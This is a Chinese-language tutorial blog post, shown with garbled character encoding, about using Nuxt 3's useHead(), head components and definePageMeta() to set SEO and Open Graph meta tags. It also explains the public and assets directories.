HTML Meta Tag é¸æ“‡ä½¿ç”¨ Nuxt 3 ä½œç‚ºç¶²ç«™é–‹ç™¼æ¡†æ¶çš„é–‹ç™¼è€…ï¼Œå¤šæ•¸éƒ½æ˜¯ç‚ºäº†è¦ä½¿ç”¨ SSR æˆ– SSG ä¾†åŠ å¼·å° SEO çš„å„ªåŒ–è¨­ç½®ï¼Œé€™ç¯‡å°‡æœƒè¬›è¿° Nuxt æä¾›çš„å¹¾å€‹çµ„åˆå¼å‡½æ•¸ï¼Œä¾†å”åŠ©æˆ‘å€‘è¨­ç½®ç¶²é çš„æ¨™é¡Œã€å…§æ–‡ã€Meta ç­‰ï¼Œä»¥æ­¤ä¾†è¨­ç½® SEO æˆ–å¤–éƒ¨é€£çµå¯èƒ½æœƒè§£æåˆ°çš„æ¨™ç±¤èˆ‡æ•¸å€¼å…§å®¹ã€‚\næœå°‹å¼•æ“æœ€ä½³åŒ– (SEO) - ç¶²ç«™çš„æ¨™é¡Œ (Title) èˆ‡æè¿° (Description) ç•¶ç¶²ç«™éœ€è¦åšæœå°‹å¼•æ“æœ€ä½³åŒ– (SEO) çš„æ™‚å€™ï¼ŒMeta Tag é€™å€‹åè©ä½ ä¸€å®šä¸èƒ½å¿½ç•¥ï¼ŒMeta Tag ç¨±ä¹‹ç‚ºå…ƒæ¨™ç±¤æˆ–æè¿°æ¨™ç±¤ï¼Œé¡§åæ€ç¾©ï¼Œæ˜¯ä¾†é¡å¤–æè¿°ç¶²é çš„è³‡æ–™ä½¿ç”¨ï¼›Meta Tag é€šå¸¸æ”¾ç½®åœ¨ HTML çš„ ä¸­ï¼Œé›–ç„¶ Meta Tag ä¸æœƒç›´æ¥é¡¯ç¤ºåœ¨ç¶²é ä¸Šï¼Œä½†å°æ–¼æœå°‹å¼•æ“çš„çˆ¬èŸ²ä¾†èªªï¼Œæ˜¯ç›¸ç•¶é‡è¦çš„ä¸€é …è­˜åˆ¥è³‡è¨Šï¼Œä¹Ÿæ˜¯ Facebook æå‡ºçš„ Open Graph æ”¾ç½®çš„ä½ç½®ï¼Œè®“ç¶²é çš„æ¨™é¡Œã€æè¿°æˆ–ç¸®åœ–ç­‰ï¼Œèƒ½æ­£ç¢ºçš„è¢«è§£æé¡¯ç¤ºå‡ºä¾†ã€‚\né‚£éº¼ç¶²é æ¨™é¡Œèˆ‡æè¿°ï¼Œå¦‚æœæ­£ç¢ºè¨­å®šæœƒæœ‰ä»€éº¼æ¨£å­çš„æ•ˆæœå‘¢ï¼Ÿèˆ‰ä¾‹ä¾†èªªï¼Œå‰é¢çš„ã€ä¸²æ¥ Google OAuth ç™»å…¥ã€‘æˆ‘å€‘å¯ä»¥é€éç¶²é åŸå§‹ç¢¼ä¾†æŸ¥çœ‹ï¼Œå¯ä»¥ç™¼ç¾ \u0026lt;title\u0026gt; èˆ‡ \u0026lt;meta name=\u0026quot;description\u0026quot; â€¦ /\u0026gt; éƒ½æœ‰è¨­å®šã€‚\næœå°‹å¼•æ“çˆ¬èŸ²åœ¨æ”¶éŒ„ç¶²é æ™‚ï¼Œå°±æœƒè§£æé€™äº›æ¨™ç±¤ä¾†å»ºç«‹ç´¢å¼•ï¼Œæˆ‘å€‘åœ¨ä½¿ç”¨æœå°‹è³‡æ–™æ™‚ï¼Œç¶²é çš„è³‡è¨Šä¹Ÿå°±å°æ‡‰è‘—é¡¯ç¤ºå‡ºä¾†ï¼Œå¦‚ä¸‹åœ–ã€‚\nå„å®¶çš„æœå°‹å¼•æ“çˆ¬èŸ²ï¼Œé›–ç„¶éƒ½æœ‰è‡ªå·±è§£æçš„è¦å‰‡ï¼Œä¸éæ ¹æ“š SEO çš„ç¶“é©—éƒ½æœ‰å¤§æ–¹å‘èƒ½å¤ ä¾å¾ªåšå»ºç«‹ï¼Œæ­¤å¤–å°±æ˜¯åœ¨é‡å°ç‰¹å®šçš„æœå°‹å¼•æ“åŠ å¼·è­˜åˆ¥æ¨™è¨˜ï¼Œéµç…§å®˜æ–¹æŒ‡å¼•å°±èƒ½è®“ç¶²ç«™çš„å…§å®¹èƒ½è¦‹åº¦æœ‰é¡¯è‘—æå‡ã€‚\nç¶²ç«™çš„ Open Graph (OG) OG æ˜¯ç”± Facebook æ‰€æå‡ºçš„è¨­å®šï¼Œå…¨åç‚º Open Graph Protocolï¼Œå®˜æ–¹ç¿»è­¯ç‚ºã€Œé–‹æ”¾ç¤¾äº¤é—œä¿‚åœ–ã€ï¼Œåœ¨è¨­å®šç¶²ç«™çš„ Meta æ™‚é€šå¸¸ä¹Ÿç¨± OG Tagï¼ŒFacebook æä¾›äº†ç¶²ç«™ç®¡ç†å“¡åˆ†äº«æŒ‡å—ï¼Œç•¶åˆè¨­è¨ˆçš„ç›®çš„æ˜¯ï¼Œç•¶ç¶²é ä¸­è¨­å®šäº† OG Tagï¼Œèƒ½è®“ç¶²é è¢«åˆ†äº«è‡³ç¤¾ç¾¤åª’é«”æ™‚ï¼Œèƒ½æœ‰å‘ˆç¾æ›´ç‚ºè±å¯Œçš„å…§å®¹ï¼Œä¾‹å¦‚æ¨™é¡Œã€æè¿°åŠç¸®åœ–ç­‰ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œç•¶ç¶²é è¨­å®šäº† OG Tagï¼Œä»¥é€£çµå½¢å¼è¢«åˆ†äº«è‡³ Facebookï¼Œæœƒå‘ˆç¾å¦‚ä¸‹çš„è³‡è¨Šï¼ŒFacebook æœƒè§£æç¶²é å…§çš„ OG Tag å°‡å°æ‡‰çš„å¦‚æ¨™é¡ŒåŠç¸®åœ–ç­‰è³‡è¨Šé¡¯ç¤ºå‡ºä¾†ã€‚\nå…¶ä¸­ç¸®åœ–ä¾ç…§ Facebook çš„æŒ‡å¼•ï¼Œå³æ˜¯å°æ‡‰ç¶²é ä¸­çš„ \u0026lt;meta property=\u0026quot;og:image\u0026quot; ... /\u0026gt;ã€‚\nä¸åªæ˜¯åœ¨ Facebook ä¸Šåˆ†äº«é€£çµæœƒæœ‰é€£çµé è¦½çš„æ•ˆæœï¼Œä¹Ÿå› ç‚ºå¤§å®¶éƒ½éµå¾ªè‘— OG Tag é€²è¡Œè¨­å®šï¼Œæ‰€ä»¥åœ¨å…¶ä»–ä¸»æµçš„ç¤¾ç¾¤åª’é«”æˆ–é€šè¨Šè»Ÿé«”ç­‰ä¹Ÿéƒ½æœ‰è·Ÿé€²è§£æã€‚ä¾‹å¦‚ï¼Œæˆ‘å€‘ä½¿ç”¨ LINE å‚³é€ä¸€æ¢é€£çµï¼Œä¹Ÿæœƒå› ç‚ºè¨­ç½®äº† OG Tag ä¹Ÿæœ‰æˆåŠŸè§£æå‡ºé€£çµé è¦½çš„æ•ˆæœã€‚\nLINE é–‹ç™¼è€…ä¹Ÿæœ‰æä¾›ä¸€äº›å•ç­”æŒ‡å¼•å¯ä»¥åšåƒè€ƒï¼Œé€£çµé è¦½èˆ‡ og:titleã€og:description å’Œ og:image æœ‰è‘—ç›¸æ‡‰çš„è¨­å®šé—œä¿‚ã€‚\nuseHead æˆ‘å€‘å¯ä»¥ä½¿ç”¨ Nuxt 3 æä¾›çš„ useHead() çµ„åˆå¼å‡½æ•¸ï¼Œä¾†è¨­å®šç¶²ç«™çš„ä¸€äº›æ¨™ç±¤æˆ–æ¨™è¨˜ï¼Œä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;script setup\u0026gt; useHead({ title: \u0026#39;Nuxt 3 Blog\u0026#39;, viewport: \u0026#39;width=device-width, initial-scale=1, maximum-scale=1\u0026#39;, charset: \u0026#39;utf-8\u0026#39;, meta: [ { name: \u0026#39;description\u0026#39;, content: \u0026#39;é€™è£¡æ˜¯ Nuxt 3 å­¸ç¿’ç­†è¨˜ å¯¦æˆ°éƒ¨è½æ ¼\u0026#39; } ], bodyAttrs: { class: \u0026#39;test\u0026#39; } }) \u0026lt;/script\u0026gt; useHead() å‡½æ•¸æ¥å—åƒæ•¸çš„é¡å‹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 useHead(meta: Computable\u0026lt;MetaObject\u0026gt;): void interface MetaObject extends Record\u0026lt;string, any\u0026gt; { charset?: string viewport?: string meta?: Array\u0026lt;Record\u0026lt;string, any\u0026gt;\u0026gt; link?: Array\u0026lt;Record\u0026lt;string, any\u0026gt;\u0026gt; style?: Array\u0026lt;Record\u0026lt;string, any\u0026gt;\u0026gt; script?: Array\u0026lt;Record\u0026lt;string, any\u0026gt;\u0026gt; noscript?: Array\u0026lt;Record\u0026lt;string, any\u0026gt;\u0026gt; titleTemplate?: string | ((title: string) =\u0026gt; string) title?: string bodyAttrs?: Record\u0026lt;string, any\u0026gt; htmlAttrs?: Record\u0026lt;string, any\u0026gt; } charsetï¼šæŒ‡å®š HTML çš„å­—å…ƒç·¨ç¢¼ï¼Œé è¨­ç‚º utf-8ã€‚ viewportï¼šè¨­å®šç¶²é çš„å¯è¦‹å€åŸŸï¼Œé è¨­ç‚º width=device-width, initial-scale=1ã€‚ metaï¼šæ¥å—ä¸€å€‹é™£åˆ—ï¼Œé™£åˆ—ä¸­çš„æ¯å€‹å…ƒç´ ï¼Œéƒ½å°‡æœƒå»ºç«‹ä¸€å€‹ \u0026lt;meta\u0026gt; æ¨™è¨˜ï¼Œå…ƒç´ ä¸­ç‰©ä»¶çš„å±¬æ€§å°‡å°æ‡‰è‡³ çš„å±¬æ€§ã€‚ linkï¼šæ¥å—ä¸€å€‹é™£åˆ—ï¼Œé™£åˆ—ä¸­çš„æ¯å€‹å…ƒç´ ï¼Œéƒ½å°‡æœƒå»ºç«‹ä¸€å€‹ \u0026lt;link\u0026gt; æ¨™è¨˜ï¼Œå…ƒç´ ä¸­ç‰©ä»¶çš„å±¬æ€§å°‡å°æ‡‰è‡³ çš„å±¬æ€§ã€‚ styleï¼šæ¥å—ä¸€å€‹é™£åˆ—ï¼Œé™£åˆ—ä¸­çš„æ¯å€‹å…ƒç´ ï¼Œéƒ½å°‡æœƒå»ºç«‹ä¸€å€‹ \u0026lt;style\u0026gt; æ¨™è¨˜ï¼Œå…ƒç´ ä¸­ç‰©ä»¶çš„å±¬æ€§å°‡å°æ‡‰è‡³ çš„å±¬æ€§ã€‚ scriptï¼šæ¥å—ä¸€å€‹é™£åˆ—ï¼Œé™£åˆ—ä¸­çš„æ¯å€‹å…ƒç´ ï¼Œéƒ½å°‡æœƒå»ºç«‹ä¸€å€‹ \u0026lt;script\u0026gt; æ¨™è¨˜ï¼Œå…ƒç´ ä¸­ç‰©ä»¶çš„å±¬æ€§å°‡å°æ‡‰è‡³ çš„å±¬æ€§ã€‚ noscriptï¼šæ¥å—ä¸€å€‹é™£åˆ—ï¼Œé™£åˆ—ä¸­çš„æ¯å€‹å…ƒç´ ï¼Œéƒ½å°‡æœƒå»ºç«‹ä¸€å€‹ \u0026lt;noscript\u0026gt; æ¨™è¨˜ï¼Œå…ƒç´ ä¸­ç‰©ä»¶çš„å±¬æ€§å°‡å°æ‡‰è‡³ çš„å±¬æ€§ã€‚ titleTemplageï¼šæ¥å—ä¸€å€‹å­—ä¸²æˆ–å‡½æ•¸ï¼Œç”¨ä¾†å‹•æ…‹çš„è¨­å®šè©²é é¢å…ƒä»¶çš„ç¶²é æ¨™é¡Œã€‚ titleï¼šåœ¨é é¢å…ƒä»¶è¨­ç½®éœæ…‹çš„ç¶²é æ¨™é¡Œã€‚ bodyAttrsï¼šæ¥å—ä¸€å€‹ç‰©ä»¶ï¼Œè¨­ç½®ç¶²é ä¸­ æ¨™ç±¤çš„å±¬æ€§ï¼Œç‰©ä»¶ä¸­çš„å±¬æ€§å°‡å°æ‡‰è‡³ çš„å±¬æ€§ã€‚ htmlAttrsï¼šæ¥å—ä¸€å€‹ç‰©ä»¶ï¼Œè¨­ç½®ç¶²é ä¸­ æ¨™ç±¤çš„å±¬æ€§ï¼Œç‰©ä»¶ä¸­çš„å±¬æ€§å°‡å°æ‡‰è‡³ çš„å±¬æ€§ã€‚ è‡ªè¨‚ Metadata ä½¿ç”¨ useHead() å‡½æ•¸è¨­å®šå±¬æ€§æ‰€å‚³å…¥çš„å­—ä¸²æˆ–ç‰©ä»¶å¯ä»¥æ˜¯å…·æœ‰éŸ¿æ‡‰æ€§çš„è®Šæ•¸ï¼Œç•¶æ•¸å€¼è®Šå‹•æ™‚ï¼Œç›¸å°æ‡‰çš„æ•¸å€¼ä¹Ÿæœƒä¸€åŒéŸ¿æ‡‰ï¼Œä¾‹å¦‚ä¸‹é¢çš„ç¨‹å¼ç¢¼ï¼Œå¯ä»¥å‹•æ…‹çš„è®Šæ›´æ¨™é¡Œæˆ–æè¿°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script setup\u0026gt; const title = ref(\u0026#39;Nuxt 3 Blog\u0026#39;) const description = ref(\u0026#39;é€™è£¡æ˜¯ Nuxt 3 å­¸ç¿’ç­†è¨˜ å¯¦æˆ°éƒ¨è½æ ¼\u0026#39;) useHead({ title, meta: [ { name: \u0026#39;description\u0026#39;, content: description } ] }) \u0026lt;/script\u0026gt; æ·»åŠ å‹•æ…‹ç¶²é çš„æ¨™é¡Œ æˆ‘å€‘å¯ä»¥åœ¨ app.vue æ·»åŠ å¦‚ä¸‹ç¨‹å¼ç¢¼ï¼ŒtitleTemplage ä¸­çš„ %s å°‡æœƒå¸¶å…¥ç›®å‰é é¢ title æˆ–æ›´ä¸Šå±¤é é¢çš„ title å±¬æ€§ï¼š\napp.vue 1 2 3 4 5 6 7 8 \u0026lt;script setup\u0026gt; const title = ref(\u0026#39;Nuxt 3 Blog\u0026#39;) useHead({ title, titleTemplate: \u0026#39;%s - é¦–é \u0026#39;, }) \u0026lt;/script\u0026gt; å¯ä»¥çœ‹åˆ°ç¶²é çš„æ¨™é¡Œè®Šç‚ºã€ŒNuxt 3 Blog - é¦–é ã€ã€‚\nä½ ä¹Ÿå¯ä»¥å‚³å…¥ä¸€å€‹å‡½æ•¸ä¾†å‹•æ…‹çš„æ·»åŠ ç¶²é çš„æ¨™é¡Œã€‚\napp.vue 1 2 3 4 5 6 7 8 9 10 \u0026lt;script setup\u0026gt; const title = ref(\u0026#39;Nuxt 3 Blog\u0026#39;) useHead({ title, titleTemplate: (title) =\u0026gt; { return title ? `${title} - é¦–é ` : \u0026#39;é¦–é \u0026#39; } }) \u0026lt;/script\u0026gt; æ·»åŠ å¤–éƒ¨ CSS æˆ‘å¯ä»¥ä½¿ç”¨ useHead() ä¾†æ·»åŠ  Google å­—é«”è‡³ link å±¬æ€§ä¹‹ä¸­ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script setup\u0026gt; useHead({ link: [ { rel: \u0026#39;preconnect\u0026#39;, href: \u0026#39;https://fonts.googleapis.com\u0026#39; }, { rel: \u0026#39;stylesheet\u0026#39;, href: \u0026#39;https://fonts.googleapis.com/css2?family=Roboto\u0026amp;display=swap\u0026#39;, crossorigin: \u0026#39;\u0026#39; } ] }) \u0026lt;/script\u0026gt; æ·»åŠ ç¬¬ä¸‰æ–¹çš„ JavaScript ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ useHead() ä¾†æ’å…¥ç¬¬ä¸‰æ–¹çš„ JSã€‚\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script setup\u0026gt; useHead({ script: [ { src: \u0026#39;https://third-party-script.com\u0026#39;, body: true } ] }) \u0026lt;/script\u0026gt; åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ç›¸å°æ‡‰çš„å…ƒä»¶è¨­ç½®å±¬æ€§åŠæ¨™ç±¤ Nuxt æä¾› \u0026lt;Title\u0026gt;ã€\u0026lt;Base\u0026gt;ã€\u0026lt;Script\u0026gt;ã€\u0026lt;NoScript\u0026gt;ã€\u0026lt;Style\u0026gt;ã€\u0026lt;Meta\u0026gt;ã€\u0026lt;Link\u0026gt;ã€\u0026lt;Body\u0026gt;ã€\u0026lt;Html\u0026gt; å’Œ \u0026lt;Head\u0026gt;ï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥åœ¨å…ƒä»¶ä¸­æ¨¡æ¿ (Template) ä½¿ç”¨é€™äº›å…ƒä»¶é€²è¡Œè¨­å®šç¶²é çš„å±¬æ€§åŠæ¨™ç±¤ã€‚\nå› ç‚ºé€™äº›å…ƒä»¶åç¨±èˆ‡åŸç”Ÿ HTML æ¨™è¨˜ç›¸ä¼¼ï¼Œæ‰€ä»¥è¨˜å¾—åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨è¦é–‹é ­ç‚ºå¤§å¯«ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;Head\u0026gt; \u0026lt;Title\u0026gt;{{ title }}\u0026lt;/Title\u0026gt; \u0026lt;Meta name=\u0026#34;description\u0026#34; :content=\u0026#34;description\u0026#34; /\u0026gt; \u0026lt;Style type=\u0026#34;text/css\u0026#34; children=\u0026#34;body { background-color: green; }\u0026#34;\u0026gt;\u0026lt;/Style\u0026gt; \u0026lt;/Head\u0026gt; \u0026lt;h1\u0026gt;{{ title }}\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const title = ref(\u0026#39;Nuxt 3 Blog\u0026#39;) const description = ref(\u0026#39;é€™è£¡æ˜¯ Nuxt 3 å­¸ç¿’ç­†è¨˜ å¯¦æˆ°éƒ¨è½æ ¼\u0026#39;) \u0026lt;/script\u0026gt; definePageMeta() æˆ‘å€‘å…¶å¯¦åœ¨å‰é¢å°±æœ‰ä½¿ç”¨é definePageMeta() ä¾†è¨­ç½®é é¢çš„å¸ƒå±€æˆ–ä¸­é–“ä»¶ï¼Œåœ¨å„å€‹é é¢ä¹‹ä¸­ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥ä½¿ç”¨ definePageMeta() ä¾†è¨­ç½®ä¸€äº›å±¬æ€§èˆ‡ useHead() é€²è¡Œæ­é…ã€‚\nä¾‹å¦‚ï¼Œæˆ‘å€‘çš„ app.vue ä½¿ç”¨ useHead è¨­å®šçš„ä¸€å€‹ metaï¼Œä¸¦ä¸”æ˜¯æ ¹æ“š route.meta.title æ‰€å‹•æ…‹çš„è¨­å®šã€‚\napp.vue 1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; const route = useRoute() useHead({ meta: [{ name: \u0026#39;og:title\u0026#39;, content: `${route.meta.title} | Nuxt 3 Blog` }] }) \u0026lt;/script\u0026gt; æˆ‘å€‘åœ¨ pages/articles.vue æ·»åŠ å¦‚ä¸‹ç¨‹å¼ç¢¼ï¼š\npages/articles.vue 1 2 3 4 5 \u0026lt;script setup\u0026gt; definePageMeta({ title: \u0026#39;æ‰€æœ‰æ–‡ç« \u0026#39; }) \u0026lt;/script\u0026gt; ç•¶æˆ‘å€‘ç€è¦½ /articles é é¢æ™‚ï¼ŒNuxt åœ¨ä¼ºæœå™¨ç«¯å°±å¹«æˆ‘å€‘æ¸²æŸ“å¥½ og:title çš„ meta äº†ã€‚æˆ‘å€‘å¯ä»¥é€éæª¢è¦–åŸå§‹ç¢¼çš„æ–¹å¼ä¾†çœ‹çœ‹æ•ˆæœã€‚\nåœ¨ Nuxt 3 æä¾›äº†ä¸€äº›å¯ä»¥è¨­ç½®ç¶²é å±¬æ€§èˆ‡ Meta çš„çµ„åˆå¼å‡½æ•¸ï¼Œæ›´èƒ½å‹•æ…‹çš„èª¿æ•´èˆ‡éŸ¿æ‡‰ï¼Œçµåˆ SSR è®“é€™äº›æ¨™è¨˜åœ¨ä¼ºæœå™¨ç«¯å°±èƒ½æ¸²æŸ“å‡ºä¾†ï¼Œå°ç¶²ç«™åšæœå°‹å¼•æ“æœ€ä½³åŒ– (SEO) éå¸¸å¾—å‹å–„ï¼Œä¹Ÿæ˜¯å¤šæ•¸äººé¸æ“‡ Nuxt 3 ä¾†è™•ç† SSR èˆ‡ SEO çš„åŸå› ã€‚é™¤äº† SEO å¯èƒ½æœƒä½¿ç”¨åˆ°çš„æ¨™è¨˜å¤–ï¼Œä¹Ÿæœ‰ OG Tag å¯ä»¥åŠ å¼·ç¶²é çš„é€£çµé è¦½æ•ˆæœï¼Œé›–ç„¶ OG Tag èˆ‡ SEO æ²’æœ‰çµ•å°çš„é—œä¿‚ï¼Œä½†æ˜¯é€éä¼ºæœå™¨ç«¯æ¸²æŸ“èª¿æ•´é€™äº› Meta å°æœå°‹å¼•æ“æˆ–ç¶²ç«™éƒ½éå¸¸çš„æ–¹ä¾¿ï¼Œæˆ‘å€‘åªè¦æ ¹æ“šéœ€æ±‚åŠæŒ‡å¼•åšè¨­å®šï¼Œå°±èƒ½å°ç¶²ç«™çš„èƒ½è¦‹åº¦æœ‰æ‰€æå‡ã€‚\nPublic èˆ‡ Assets è³‡æºç›®éŒ„(Nuxt 3 çš„éœæ…‹è³‡æº) åœ¨ç¶²ç«™çš„é–‹ç™¼éç¨‹ä¸­ï¼Œå¤šå°‘æœƒä½¿ç”¨åˆ°åœ–ç‰‡ã€æ¨£å¼æˆ–è¨­å®šå­—é«”ï¼Œè€Œç•¶é€™äº›æª”æ¡ˆè‹¥æ²’æœ‰å¤–éƒ¨é€£çµæˆ–æŸäº›éœ€æ±‚ä¸‹éœ€è¦åŒ…å«åœ¨å°ˆæ¡ˆå…§åšä½¿ç”¨ï¼Œæœ€å¾Œé€£å¸¶é€™äº›æª”æ¡ˆä¸€èµ·éƒ¨ç½²ã€‚åœ¨ä½¿ç”¨ create-vue å»ºç«‹çš„ Vue çš„å°ˆæ¡ˆä¸‹åŒ…å«äº† public èˆ‡ src å…§çš„ assets ç›®éŒ„ï¼Œé€™å…©å€‹ç›®éŒ„éƒ½æ˜¯å¯ä»¥æ”¾ç½®é€™é¡ä¸å¸¸è®Šå‹•çš„éœæ…‹è³‡æºï¼Œä½†é€™å…©å€‹ç›®éŒ„å„è‡ªå› ç‚ºä¸€äº›ç‰¹æ€§ï¼Œå»ºè­°æ”¾ç½®çš„æª”æ¡ˆé¡å‹ä¾æ“šä½¿ç”¨ç›®çš„æœ‰æ‰€å€åˆ¥ã€‚\nNuxt 3 ä½¿ç”¨å°ˆæ¡ˆä¸‹çš„å…©å€‹ç›®éŒ„ä¾†æä¾›ä½¿ç”¨è€…è™•ç†åœ–ç‰‡ã€æ¨£å¼æˆ–å­—é«”ï¼Œé€™å…©å€‹ç›®éŒ„åˆ†åˆ¥ç‚º public èˆ‡ assetsã€‚\npublic ç›®éŒ„ åœ¨ Nuxt 3 çš„å°ˆæ¡ˆæ ¹ç›®éŒ„ä¸‹ï¼Œå­˜åœ¨ä¸€å€‹åç‚º public çš„ç›®éŒ„ï¼Œé€™å€‹ç›®éŒ„å¦‚åŒ Vue ä¸­çš„ public ç›®éŒ„æˆ– Nuxt 2 ä¸­çš„ static ç›®éŒ„ã€‚é€™å€‹ç›®éŒ„ä¸‹çš„æª”æ¡ˆï¼Œå°‡æœƒç”± Nuxt ç›´æ¥æ–¼ç¶²ç«™çš„æ ¹è·¯å¾‘ï¼Œä¾‹å¦‚ / æä¾›å­˜å–ã€‚\nä¾‹å¦‚å»ºç«‹ public/robots.txt å°‡å¯ä»¥ä½¿ç”¨ http://localhost:3000/robots.txt å­˜å–ã€‚\né€šå¸¸æˆ‘å€‘æœƒåœ¨ public ç›®éŒ„æ”¾ç½®ä¸å¸¸æ›´å‹•çš„æª”æ¡ˆï¼Œæˆ–æ˜¯éœ€è¦ä¿ç•™æª”æ¡ˆçš„åç¨±ï¼Œä¾‹å¦‚ robots.txt å°±éœ€è¦ä¸€å€‹å›ºå®šçš„åç¨±ï¼Œæ‰èƒ½æ­£ç¢ºçš„è¢«æœå°‹å¼•æ“çš„çˆ¬èŸ²æ‰€è§£æå†æ±ºå®šæª¢ç´¢çš„è¦å‰‡ï¼ŒæŠ‘æˆ– sitemap.xml èˆ‡ favicon.ico æª”æ¡ˆç­‰ï¼Œéƒ½å¾ˆé©åˆæ”¾ç½®åœ¨ public ç›®éŒ„ã€‚\nä½ å¯èƒ½ä¹Ÿæœƒæƒ³ï¼Œé‚£åœ–ç‰‡æˆ– CSS æ¨£å¼ï¼Œæˆ‘ä¹Ÿä¸å¸¸è®Šå‹•ï¼Œé›£é“å°±ä¸èƒ½æ”¾ç½®åœ¨ public ç›®éŒ„å—ï¼Ÿ\nè¡Œï¼Œç•¶ç„¶è¡Œï¼Œå“ªæ¬¡ä¸è¡Œï¼\nèˆ‰å€‹ä¾‹å­ï¼Œæˆ‘å€‘å°‡é€™å¼µåœ–ç‰‡æ”¾ç½®æ–¼ public ç›®éŒ„ä¸‹ä¸¦å‘½åç‚º bg.pngï¼Œå°ˆæ¡ˆç›®éŒ„ä¸‹å…¶ä»–æª”æ¡ˆå°±å…ˆä¸åˆ—ï¼Œæ•´å€‹çµæ§‹å¤§æ¦‚é•·çš„åƒä¸‹é¢é€™æ¨£ã€‚\n1 2 3 4 nuxt-app/ â”œâ”€â”€ public/ â”‚ â””â”€â”€ bg.png â””â”€â”€ app.vue æ ¹æ“šè¦å‰‡ï¼Œæˆ‘å¯ä»¥ä½¿ç”¨ http://localhost:3000/bg.png å­˜å–ï¼Œå¦‚ä¸‹åœ–æˆ‘å€‘ç¢ºå¯¦æˆåŠŸçš„èƒ½å­˜å–åˆ°åœ–ç‰‡ã€‚\næ‰€ä»¥ï¼Œæˆ‘å€‘åœ¨ app.vue æ–°å¢å¦‚ä¸‹ç¨‹å¼ç¢¼ï¼Œä½¿ç”¨ /bg.png ä¾†ç­‰åŒè¨ªå• public/bg.png æª”æ¡ˆï¼š\napp.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;img src=\u0026#34;/bg.png\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; ä¹Ÿç¢ºå¯¦èƒ½åœ¨ç¶²é ä¸­ä½¿ç”¨ \u0026lt;img src=\u0026quot;/bg.png\u0026quot; /\u0026gt; ä¾†é¡¯ç¤ºåœ–ç‰‡ã€‚\næ—¢ç„¶ public ç›®éŒ„å·²ç¶“èƒ½æä¾›éœæ…‹è³‡æºçš„é€£çµï¼Œé‚£éº¼ç‚ºä»€éº¼é‚„æœ‰ä¸€å€‹åç‚º assets çš„ç›®éŒ„å‘¢ï¼Ÿæ¥ä¸‹ä¾†æˆ‘å€‘å…ˆä»‹ç´¹ assets ç›®éŒ„ï¼Œæœ€å¾Œå†ä¾†ç¸½çµä¸€ä¸‹å·®ç•°ã€‚\nassets ç›®éŒ„ Nuxt 3 ä½¿ç”¨ Vite æˆ– Webpack ä¾†å»ºæ§‹å°ˆæ¡ˆé€²è¡Œæ‰“åŒ…ï¼Œé€™äº›å»ºæ§‹å·¥å…·ä¸»è¦åŠŸèƒ½æ˜¯ç”¨ä¾†è™•ç† JavaScript æª”æ¡ˆå°‡å…¶ç·¨è­¯ã€è½‰æ›æˆ–å£“ç¸®ç­‰ï¼Œä½†å®ƒå€‘å¯ä»¥é€éå„è‡ªçš„æ’ä»¶æˆ– Loader ä¾†è™•ç†å…¶ä»–æª”æ¡ˆé¡å‹çš„è³‡æºï¼Œä¾‹å¦‚æ¨£å¼ã€å­—é«”æˆ– SVG ç­‰ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å€‘åœ¨ assets ä¸‹å»ºç«‹ä¸€å€‹ Sass çš„æ¨£å¼ï¼Œç•¶é€™å€‹ Sass æª”æ¡ˆè¢«è¼‰å…¥ä½¿ç”¨ï¼Œå°±æœƒç¶“éæ’ä»¶æˆ– Loader ä¾†é€²è¡Œ CSS çš„é è™•ç†åŠç·¨è­¯ï¼Œæœ€çµ‚ç”¢ç”Ÿä¸€å€‹ CSS æª”æ¡ˆï¼Œä¹Ÿå¯ä»¥é‡å°å–®ç´”çš„ CSS æª”æ¡ˆé€²è¡Œå£“ç¸®ã€‚åˆæˆ–è€…èªªï¼Œç•¶ä½¿ç”¨ \u0026lt;img\u0026gt; çš„ src å±¬æ€§è¨­å®šè¼‰å…¥æˆ‘å€‘æ”¾ç½®åœ¨ assets çš„åœ–ç‰‡æˆ–åœ–ç¤ºï¼Œæœ€çµ‚éœ€è¦è½‰æ›ç‚º Base64 ç·¨ç¢¼è€Œä¸æ˜¯ç”¢ç”Ÿä¸€å€‹é€£çµï¼Œæˆ‘å€‘ä¹Ÿéœ€è¦ä¾è³´å»ºæ§‹å·¥å…·æ’ä»¶çš„æ“´å±•ä¾†å¹«åŠ©ã€‚\nå…¶ä¸»è¦çš„ç›®çš„ï¼Œä¸å¤–ä¹å°±æ˜¯ç‚ºäº†æ•ˆèƒ½èˆ‡è§£æ±ºç€è¦½å™¨çš„å¿«å–ã€‚æ”¾ç½®åœ¨ assets ç›®éŒ„ä¸‹çš„æª”æ¡ˆï¼Œå¯èƒ½æœƒè¢«æ’ä»¶æˆ– Loader é€²è¡Œè½‰æ›æˆ–å£“ç¸®ï¼Œæœ€çµ‚ç”¢ç”Ÿå‡ºä¾†çš„æª”æ¡ˆä¹Ÿå…·å‚™é€£çµå¯ä»¥é€²è¡Œå­˜å–ã€‚\nå¦‚æœä½¿ç”¨ public ç›®éŒ„ä¸‹å°å‡ºçš„ /bg.pngï¼Œå°±ç®—æˆ‘å€‘æ›¿æ›äº† bg.png åœ–ç‰‡ï¼Œå¯èƒ½å°±æœƒå› ç‚ºæª”æ¡ˆæ 